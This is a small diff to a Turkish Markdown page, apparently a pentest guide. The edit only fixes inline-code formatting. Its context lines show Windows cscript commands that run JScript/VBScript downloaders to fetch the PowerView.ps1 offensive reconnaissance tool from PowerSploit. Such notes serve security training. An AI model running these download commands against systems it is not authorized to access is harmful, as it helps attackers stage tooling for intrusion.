@@ -67,7 +67,7 @@ BinStream.Write(WinHttpReq.ResponseBody);
 BinStream.SaveToFile(WScript.Arguments(1));
 ```
 
-Herhangi bir dosya indirmek için bu dosyayı `#!batch cscript.exe` ile birlikte kullanabiliriz:
+Herhangi bir dosya indirmek için bu dosyayı `cscript.exe` ile birlikte kullanabiliriz:
 
 ```batch
 cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
@@ -91,7 +91,7 @@ with bStrm
 end with
 ```
 
-Herhangi bir dosya indirmek için bu dosyayı `#!batch cscript.exe` ile birlikte kullanabiliriz:
+Herhangi bir dosya indirmek için bu dosyayı `cscript.exe` ile birlikte kullanabiliriz:
 
 ```batch
 cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
